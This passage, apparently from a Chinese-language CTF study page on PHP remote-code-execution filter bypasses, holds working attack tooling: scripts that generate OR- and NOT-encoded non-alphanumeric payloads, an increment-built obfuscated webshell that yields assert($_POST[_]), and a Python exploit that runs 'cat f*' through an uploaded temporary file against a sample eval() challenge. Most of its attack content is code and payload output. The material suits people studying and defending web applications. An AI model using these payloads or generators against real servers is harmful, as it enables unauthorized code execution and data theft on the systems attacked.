</span></span><span style="display:flex;"><span><span style="color:#75715e">// 生成或构造结果
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* author yu22x */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;or_rce.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ($j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>) {
</span></span><span style="display:flex;"><span>      $hex_i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($i);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      $hex_i <span style="color:#f92672">=</span> <span style="color:#a6e22e">dechex</span>($i);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>) {
</span></span><span style="display:flex;"><span>      $hex_j <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($j);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      $hex_j <span style="color:#f92672">=</span> <span style="color:#a6e22e">dechex</span>($j);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $preg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/[0-9a-z]/i&#39;</span>; <span style="color:#75715e">//根据题目给的正则表达式修改即可
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($preg, <span style="color:#a6e22e">hex2bin</span>($hex_i)) <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>($preg, <span style="color:#a6e22e">hex2bin</span>($hex_j))) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      $a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">.</span> $hex_i;
</span></span><span style="display:flex;"><span>      $b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">.</span> $hex_j;
</span></span><span style="display:flex;"><span>      $c <span style="color:#f92672">=</span> (<span style="color:#a6e22e">urldecode</span>($a) <span style="color:#f92672">|</span> <span style="color:#a6e22e">urldecode</span>($b));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ord</span>($c) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">ord</span>($c) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>) {
</span></span><span style="display:flex;"><span>        $contents <span style="color:#f92672">=</span> $contents <span style="color:#f92672">.</span> $c <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $a <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $b <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>($myfile, $contents);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($myfile);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 构造 payload</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># author yu22x</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action</span>(arg):
</span></span><span style="display:flex;"><span>   s1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   s2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> arg:
</span></span><span style="display:flex;"><span>       f<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#34;or_rce.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>           t<span style="color:#f92672">=</span>f<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> t<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span> t[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span>i:
</span></span><span style="display:flex;"><span>               <span style="color:#75715e">#print(i)</span>
</span></span><span style="display:flex;"><span>               s1<span style="color:#f92672">+=</span>t[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span>               s2<span style="color:#f92672">+=</span>t[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">9</span>]
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>       f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>   output<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>s1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>s2<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span>(output)
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>   param<span style="color:#f92672">=</span>action(input(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] your function：&#34;</span>) )<span style="color:#f92672">+</span>action(input(<span style="color:#e6db74">&#34;[+] your command：&#34;</span>))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;;&#34;</span>
</span></span><span style="display:flex;"><span>   print(param)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># 运行结果</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> your <span style="color:#66d9ef">function</span>：system
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> your command：ls
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%13%19%13%14%05%0d&#34;</span>|<span style="color:#e6db74">&#34;%60%60%60%60%60%60&#34;</span><span style="color:#f92672">)(</span><span style="color:#e6db74">&#34;%0c%13&#34;</span>|<span style="color:#e6db74">&#34;%60%60&#34;</span><span style="color:#f92672">)</span>;
</span></span></code></pre></div><h3 id="取反绕过">
  取反绕过
  <a class="anchor" href="#%e5%8f%96%e5%8f%8d%e7%bb%95%e8%bf%87">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//在命令行中运行
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*author yu22x*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(<span style="color:#a6e22e">STDOUT</span>, <span style="color:#e6db74">&#39;[+]your function: &#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$system <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>), <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">fgets</span>(<span style="color:#a6e22e">STDIN</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(<span style="color:#a6e22e">STDOUT</span>, <span style="color:#e6db74">&#39;[+]your command: &#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$command <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>), <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">fgets</span>(<span style="color:#a6e22e">STDIN</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[*] (~&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span>$system) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;)(~&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span>$command) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;);&#39;</span>;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># 运行结果</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>your <span style="color:#66d9ef">function</span>: system
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>your command: ls
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>~%8C%86%8C%8B%9A%92<span style="color:#f92672">)(</span>~%93%8C<span style="color:#f92672">)</span>;
</span></span></code></pre></div><h3 id="自增绕过">
  自增绕过
  <a class="anchor" href="#%e8%87%aa%e5%a2%9e%e7%bb%95%e8%bf%87">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//测试发现 7.0.12 以上版本不可使用
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//使用时需要 url 编码下
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=</span>[];$_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span>;$_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>];$___<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$___<span style="color:#f92672">.=</span>$__;$___<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$___<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$___<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$___<span style="color:#f92672">.=</span>$__;$____<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_&#39;</span>;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$____<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$____<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$____<span style="color:#f92672">.=</span>$__;$__<span style="color:#f92672">=</span>$_;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$____<span style="color:#f92672">.=</span>$__;$_<span style="color:#f92672">=</span>$$____;$___($_[<span style="color:#a6e22e">_</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">固定格式</span> <span style="color:#a6e22e">构造出来的</span> <span style="color:#a6e22e">assert</span>($_POST[<span style="color:#a6e22e">_</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">然后</span> <span style="color:#a6e22e">post</span> <span style="color:#a6e22e">传入</span>   <span style="color:#a6e22e">_</span><span style="color:#f92672">=</span><span style="color:#a6e22e">phpinfo</span>();
</span></span></code></pre></div><h3 id="上传临时文件绕过">
  上传临时文件绕过
  <a class="anchor" href="#%e4%b8%8a%e4%bc%a0%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6%e7%bb%95%e8%bf%87">#</a>
</h3>
<p>题目代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>])){
</span></span><span style="display:flex;"><span>    $code <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;code&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($code)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">35</span>){ <span style="color:#75715e">//长度不能超过 35
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Long.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[A-Za-z0-9_$]+/&#34;</span>,$code)){ <span style="color:#75715e">//不能包含下划线和$
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;NO.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>($code);
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#coding:utf-8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#author yu22x</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&#34;</span>
</span></span><span style="display:flex;"><span>files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;file&#39;</span>:<span style="color:#e6db74">&#39;cat f*&#39;</span>}
</span></span><span style="display:flex;"><span>response<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,files<span style="color:#f92672">=</span>files)
</span></span><span style="display:flex;"><span>html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>print(html)
</span></span></code></pre></div></article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#执行-php-代码函数">执行 PHP 代码函数</a></li>
    <li><a href="#执行系统命令函数">执行系统命令函数</a>
      <ul>
        <li><a href="#system">system()</a></li>
        <li><a href="#exec">exec()</a></li>
        <li><a href="#passthru">passthru()</a></li>
        <li><a href="#shell_exec">shell_exec()</a></li>
        <li><a href="#-反引号">` 反引号</a></li>
        <li><a href="#popen">popen()</a></li>
        <li><a href="#proc_open">proc_open()</a></li>
        <li><a href="#pcntl_exec">pcntl_exec()</a></li>
      </ul>
    </li>
    <li><a href="#ld_preload-绕过">LD_PRELOAD 绕过</a>
      <ul>
        <li><a href="#程序的链接">程序的链接</a></li>
        <li><a href="#ld_preload">LD_PRELOAD</a></li>
        <li><a href="#绕过条件">绕过条件</a></li>
        <li><a href="#可利用函数">可利用函数</a></li>
        <li><a href="#蚁剑绕过">蚁剑绕过</a></li>
      </ul>
    </li>
    <li><a href="#操作系统连接符">操作系统连接符</a>
      <ul>
        <li><a href="#linux">Linux</a></li>
        <li><a href="#windows">Windows</a></li>
      </ul>
    </li>
    <li><a href="#空格过滤绕过">空格过滤绕过</a>
      <ul>
        <li><a href="#ifs-代替空格内部字段分隔符">$IFS 代替空格（内部字段分隔符）</a></li>
        <li><a href="#大括号">大括号</a></li>
        <li><a href="#重定向字符">重定向字符</a></li>
        <li><a href="#09tab">%09（Tab）</a></li>
      </ul>
    </li>
    <li><a href="#文件名过滤绕过">文件名过滤绕过</a>
      <ul>
        <li><a href="#通配符">通配符</a></li>
        <li><a href="#单双引号绕过">单双引号绕过</a></li>
        <li><a href="#反斜杠绕过">反斜杠绕过</a></li>
        <li><a href="#特殊变量">特殊变量</a></li>
        <li><a href="#内联执行拼接">内联执行（$拼接）</a></li>
        <li><a href="#利用-linux-中的环境变量">利用 linux 中的环境变量</a></li>
      </ul>
    </li>
    <li><a href="#常见文件读取命令绕过">常见文件读取命令绕过</a></li>
    <li><a href="#编码绕过">编码绕过</a>
      <ul>
        <li><a href="#base64">base64</a></li>
        <li><a href="#base32">base32</a></li>
        <li><a href="#base58">base58</a></li>
        <li><a href="#hex-编码">HEX 编码</a></li>
        <li><a href="#shellcode">shellcode</a></li>
      </ul>
    </li>
    <li><a href="#无回显时间盲注">无回显时间盲注</a></li>
    <li><a href="#长度过滤绕过">长度过滤绕过</a>
      <ul>
        <li><a href="#相关命令">相关命令</a></li>
        <li><a href="#组合运用">组合运用</a></li>
        <li><a href="#长度限制为-5-的绕过">长度限制为 5 的绕过</a></li>
        <li><a href="#长度限制为-4-的绕过">长度限制为 4 的绕过</a></li>
      </ul>
    </li>
    <li><a href="#无参数">无参数</a>
      <ul>
        <li><a href="#常见函数解释">常见函数解释</a></li>
      </ul>
    </li>
    <li><a href="#无参数命令执行请求头绕过">无参数命令执行请求头绕过</a>
      <ul>
        <li><a href="#请求头-rce">请求头 RCE</a></li>
      </ul>
    </li>
    <li><a href="#无字母数字绕过">无字母数字绕过</a>
      <ul>
        <li><a href="#异或运算绕过">异或运算绕过</a></li>
        <li><a href="#或运算绕过">或运算绕过</a></li>
        <li><a href="#取反绕过">取反绕过</a></li>
        <li><a href="#自增绕过">自增绕过</a></li>
        <li><a href="#上传临时文件绕过">上传临时文件绕过</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












